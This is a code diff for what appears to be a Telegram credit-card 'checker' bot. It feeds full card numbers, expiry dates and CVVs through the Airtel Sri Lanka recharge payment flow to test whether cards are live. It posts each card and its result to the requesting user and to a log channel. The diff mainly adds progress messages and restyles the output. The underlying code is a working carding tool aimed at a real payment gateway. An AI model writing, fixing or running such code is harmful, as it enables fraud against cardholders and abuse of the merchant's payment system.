@@ -1,11 +1,14 @@
-from bs4 import BeautifulSoup
+
 import requests
 import json
 import re
 import json
 import time
-from .encrypt import encrypt_data, gen_public_key
 import random
+from bs4 import BeautifulSoup
+from bin_look import bin_lokup
+from .encrypt import encrypt_data, gen_public_key
+
 
 
 def checking_function(credit_number, bot, message, update_cooldown, user_id):
@@ -21,6 +24,11 @@ def checking_function(credit_number, bot, message, update_cooldown, user_id):
     if len(ano) == 2:
       ano = '20' + ano
     cvv = extracted_parts[3]
+    
+    bot.edit_message_text(
+      chat_id=message.chat.id,
+      message_id=message.message_id,text="𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆 ◈◈◇◇"
+    )
     # Define the URL
     url_paymentInit = 'https://recharge.airtel.lk/recharge/scapp/payment/paymentInit'
     session = requests.Session()
@@ -67,6 +75,7 @@ def checking_function(credit_number, bot, message, update_cooldown, user_id):
         'ipg_type': '',
         'cux_type': '1'
     }
+    
 
     # Send the POST request
     response_paymentInit = session.post(url_paymentInit,
@@ -145,6 +154,10 @@ def checking_function(credit_number, bot, message, update_cooldown, user_id):
         'bill_to_surname': 'Airtel',
         'signature': signature
     }
+    bot.edit_message_text(
+      chat_id=message.chat.id,
+      message_id=message.message_id,text="𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆 ◈◈◈◇"
+    )
 
     response_for_2req = session.post(url_pay,
                                      headers=headers_pay,
@@ -154,7 +167,7 @@ def checking_function(credit_number, bot, message, update_cooldown, user_id):
     initial_cookies_dict = {}
     bot.edit_message_text(chat_id=message.chat.id,
                           message_id=message.message_id,
-                          text="Authenticating..")
+                          text="𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆 ◈◈◈◈")
     initial_cookies = response_for_2req.history[0].cookies
     for cookie in initial_cookies:
       initial_cookies_dict[cookie.name] = cookie.value
@@ -372,8 +385,9 @@ def checking_function(credit_number, bot, message, update_cooldown, user_id):
     response_auth = session.post(url_auth,
                                  headers=headers_auth,
                                  data=payload_auth)
-
-    #print(response_auth.text)
+#print(response_auth.text)
+    
+    #print(response_r)
     # Convert the JSON string to a Python dictionary
     response_data = json.loads(response_auth.text)
     result_auth = response_data
@@ -384,7 +398,8 @@ def checking_function(credit_number, bot, message, update_cooldown, user_id):
       formatted_result = f"__» CYBERSOURCE CHARGE__\n\n**» CARD :** `{credit_number}`\n**» STATUS :** DECLINE\n**» RESPONSE :** Need Authentication \n**» CURRENCY : LKR**\n\n**» TIME : **{formated_time}"
       bot.edit_message_text(chat_id=message.chat.id,
                             message_id=message.message_id,
-                            text=formatted_result, parse_mode="Markdown")
+                            text=formatted_result,
+                            parse_mode="Markdown")
       update_cooldown(message.from_user.id, end)
       return True
 
@@ -442,14 +457,22 @@ def checking_function(credit_number, bot, message, update_cooldown, user_id):
       message_decision_value = message_decision.get('value')
       end = time.time()
       elapsed_time = end - start
+
+      user_link = f"[{message.from_user.first_name}](tg://user?id={user_id}')"
+      
       formated_time = "{:.2f}".format(elapsed_time)
-      formatted_result = f"» CYBERSOURCE CHARGE\n\n» CARD : `{credit_number}`\n» STATUS : {message_decision_value}\n» RESPONSE : {message_value} \n» CURRENCY : LKR\n\n» TIME : {formated_time}"
+      formatted_result = f"» 𝐂𝐘𝐁𝐄𝐑𝐒𝐎𝐔𝐑𝐂𝐄 𝐂𝐇𝐀𝐑𝐆𝐄\n\n» 𝐂𝐀𝐑𝐃 : <code>{credit_number}</code>\n» 𝐒𝐓𝐀𝐓𝐔𝐒 : {message_decision_value}\n» 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 : {message_value} \n» 𝐂𝐔𝐑𝐑𝐄𝐍𝐂𝐘 : LKR\n\n» 𝐑𝐄𝐐 𝐁𝐘 : <a href='tg://user?id={user_id}'>{user_id}</a>\n» 𝐓𝐈𝐌𝐄 : {formated_time} s"
       bot.edit_message_text(chat_id=message.chat.id,
                             message_id=message.message_id,
-                            text=formatted_result, parse_mode='Markdown')
-      
-      bot.send_message(chat_id=log_channel_id, text=f"{formatted_result}\n\n<a href='tg://user?id={user_id}'>User</a>", parse_mode='HTML')
-      
+                            text=formatted_result,
+                            parse_mode='HTML')
+
+      bot.send_message(
+          chat_id=log_channel_id,
+          text=
+          f"{formatted_result}\n\n",
+          parse_mode='HTML')
+
       update_cooldown(message.from_user.id, end)
       return True
     else:
